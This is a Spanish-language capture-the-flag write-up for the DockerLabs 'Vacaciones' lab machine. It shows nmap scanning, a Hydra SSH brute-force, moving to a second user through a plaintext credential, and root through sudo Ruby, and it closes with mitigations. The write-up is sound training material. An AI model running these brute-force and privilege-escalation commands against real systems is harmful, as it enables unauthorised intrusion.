---
title: Vacaciones
description: Resolución de la máquina Vacaciones de DockerLabs
---

<div class="writeup-hero">

  <div class="writeup-hero-content">

    <h1>Vacaciones</h1>

    <p class="writeup-hero-description">
      Máquina enfocada en inspección de código HTML, fuerza bruta contra SSH, movimiento entre usuarios y escalada de privilegios mediante Ruby ejecutado con sudo.
    </p>

    <div class="writeup-badges">
      <span class="writeup-badge">DockerLabs</span>
      <span class="writeup-badge writeup-badge-success">Very Easy</span>
      <span class="writeup-badge">Linux</span>
      <span class="writeup-badge">Completada</span>
    </div>

  </div>

  <div class="writeup-summary">

    <div class="writeup-summary-row">
      <span>Plataforma</span>
      <strong>DockerLabs</strong>
    </div>

    <div class="writeup-summary-row">
      <span>Dificultad</span>
      <strong>Very Easy</strong>
    </div>

    <div class="writeup-summary-row">
      <span>Sistema</span>
      <strong>Linux</strong>
    </div>

    <div class="writeup-summary-row">
      <span>Acceso inicial</span>
      <strong>SSH como camilo</strong>
    </div>

    <div class="writeup-summary-row">
      <span>Escalada</span>
      <strong>Ruby mediante sudo</strong>
    </div>

  </div>

</div>

<div class="writeup-techniques">
  <span class="writeup-technique">Nmap</span>
  <span class="writeup-technique">HTML</span>
  <span class="writeup-technique">SSH</span>
  <span class="writeup-technique">Hydra</span>
  <span class="writeup-technique">find</span>
  <span class="writeup-technique">Movimiento lateral</span>
  <span class="writeup-technique">Ruby</span>
  <span class="writeup-technique">Sudo</span>
</div>

## 1. Preparación de la máquina

Se desplegó la máquina Vacaciones desde DockerLabs.

<!-- IMAGEN PENDIENTE: despliegue de Vacaciones -->

## 2. Reconocimiento de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv <IP_OBJETIVO> -oG allPorts
```

El escaneo mostró:

| Puerto | Servicio | Estado |
|---:|---|---|
| 22/TCP | SSH | Abierto |
| 80/TCP | HTTP | Abierto |

<!-- IMAGEN PENDIENTE: escaneo inicial -->

## 3. Enumeración de servicios

```bash
sudo nmap -p 22,80 -sCV <IP_OBJETIVO> -oN targeted
```

Se identificaron:

- OpenSSH 7.6p1.
- Apache 2.4.29.

<!-- IMAGEN PENDIENTE: versiones encontradas -->

## 4. Inspección de la página web

La página web no mostraba contenido visible.

Se revisó su código fuente desde el navegador:

```text
Ctrl + U
```

También puede consultarse desde la terminal:

```bash
curl http://<IP_OBJETIVO>/
```

Dentro de un comentario HTML aparecieron dos posibles usuarios:

```text
camilo
juan
```

<!-- IMAGEN PENDIENTE: comentario HTML con usuarios -->

## 5. Fuerza bruta contra SSH

Se probaron los usuarios encontrados mediante Hydra.

Para Camilo:

```bash
hydra \
    -l camilo \
    -P /usr/share/wordlists/rockyou.txt \
    ssh://<IP_OBJETIVO>
```

La prueba encontró una contraseña válida para `camilo`.

<!-- IMAGEN PENDIENTE: contraseña encontrada para camilo -->

## 6. Acceso inicial

Se inició sesión mediante SSH:

```bash
ssh camilo@<IP_OBJETIVO>
```

Se comprobó la identidad:

```bash
whoami
id
```

Resultado:

```text
camilo
```

## 7. Enumeración interna

La cuenta de Camilo tenía permisos limitados.

Se buscaron archivos de texto que pudieran contener mensajes o información:

```bash
find / -type f -name "*.txt" 2>/dev/null
```

También se revisaron archivos accesibles dentro de directorios de usuarios:

```bash
find /home -type f 2>/dev/null
```

Se encontró un mensaje dejado por Juan que contenía información para acceder a su cuenta.

<!-- IMAGEN PENDIENTE: mensaje o correo encontrado -->

## 8. Movimiento al usuario Juan

Con la contraseña encontrada se cambió de usuario:

```bash
su juan
```

Después se comprobó la identidad:

```bash
whoami
```

Resultado:

```text
juan
```

<!-- IMAGEN PENDIENTE: acceso como juan -->

## 9. Enumeración de privilegios

Desde la cuenta de Juan se revisaron los permisos de sudo:

```bash
sudo -l
```

La configuración permitía ejecutar Ruby como `root`.

Ruby puede ejecutar comandos del sistema, por lo que este permiso permite abrir una shell privilegiada.

<!-- IMAGEN PENDIENTE: permiso sudo para Ruby -->

## 10. Escalada mediante Ruby

Se utilizó Ruby para ejecutar una shell:

```bash
sudo ruby -e 'exec "/bin/bash"'
```

Se comprobó la identidad final:

```bash
whoami
```

Resultado:

```text
root
```

También puede comprobarse con:

```bash
id
```

<!-- IMAGEN PENDIENTE: acceso final como root -->

## 11. Vulnerabilidades encontradas

### Usuarios expuestos en comentarios HTML

El código fuente revelaba nombres de cuentas válidas del sistema.

### Contraseña débil en SSH

La contraseña de Camilo podía descubrirse mediante un ataque de diccionario.

### Credenciales almacenadas en texto plano

Un archivo accesible contenía información para ingresar como Juan.

### Permisos sudo peligrosos

Ruby podía ejecutarse como root y utilizarse para abrir una shell.

## 12. Medidas de mitigación

- Eliminar comentarios sensibles del código HTML.
- No almacenar contraseñas en archivos de texto.
- Aplicar permisos correctos en directorios y archivos personales.
- Usar contraseñas largas, únicas y aleatorias.
- Priorizar autenticación mediante claves SSH.
- Implementar protección contra fuerza bruta.
- No conceder permisos sudo a intérpretes como Ruby.
- Aplicar el principio de mínimo privilegio.
- Revisar periódicamente los permisos de sudo.
- Supervisar accesos y cambios entre usuarios.

## 13. Conclusión

La resolución siguió este flujo:

1. Escaneo de puertos.
2. Enumeración de SSH y Apache.
3. Inspección del código HTML.
4. Descubrimiento de `camilo` y `juan`.
5. Fuerza bruta contra la cuenta de Camilo.
6. Acceso mediante SSH.
7. Búsqueda de archivos internos.
8. Obtención de credenciales de Juan.
9. Movimiento lateral a Juan.
10. Abuso de Ruby mediante sudo.
11. Obtención de acceso como `root`.

La vulnerabilidad principal fue la combinación de exposición de usuarios, credenciales débiles, almacenamiento inseguro de contraseñas y permisos sudo excesivos.


